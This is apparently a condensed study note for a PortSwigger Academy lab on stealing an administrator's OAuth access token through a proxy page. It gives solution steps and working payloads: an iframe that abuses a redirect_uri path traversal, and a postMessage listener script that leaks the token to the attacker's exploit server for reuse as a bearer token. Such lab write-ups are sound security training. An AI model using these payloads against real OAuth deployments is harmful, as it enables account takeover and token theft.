# Lab: Stealing OAuth access tokens via a proxy page

**Official PortSwigger URL:** https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

**Lab idea:** The provider's token handling combines with a separate weakness in the client application to expose an administrator's access token through a page that acts as an unintended intermediary. The challenge practices tracing token exposure across interacting vulnerabilities and understanding the sensitivity of bearer tokens.

## Vulnerability in brief
OAuth is a framework for delegated access; applications also use OAuth flows to sign users in through an identity held by another service. This Academy section is a **vulnerability topic**, not a general learning or testing category. It focuses on security failures in OAuth-based authentication and related OpenID Connect implementations.

## Solution idea
1. Study the OAuth flow while proxying traffic through Burp.
2. Using Burp, audit the other pages on the blog website.
3. From the proxy history, right-click on the GET /auth?client_id=[...] request and select "Copy URL".
4. Below this, add a suitable script that will listen for web messages and output the contents somewhere.
5. To check the exploit is working, store it and then click "View exploit".
6. Go back to the exploit server and deliver this exploit to the victim.
7. Send the GET /me request to Burp Repeater.
8. Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.

## Payloads / key values
- `redirect_uri`
- `iframe`
- `/post/comment/comment-form`
- `postMessage()`
- `window.location.href`
- `*`
- `GET /auth?client_id=[...]`
- `src`
- `<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>`
- `<script> window.addEventListener('message', function(e) { fetch("/" + encodeURIComponent(e.data.data)) }, false) </script>`
- `GET /me`
- `Authorization: Bearer`

## Official source
- [PortSwigger Academy: Lab: Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
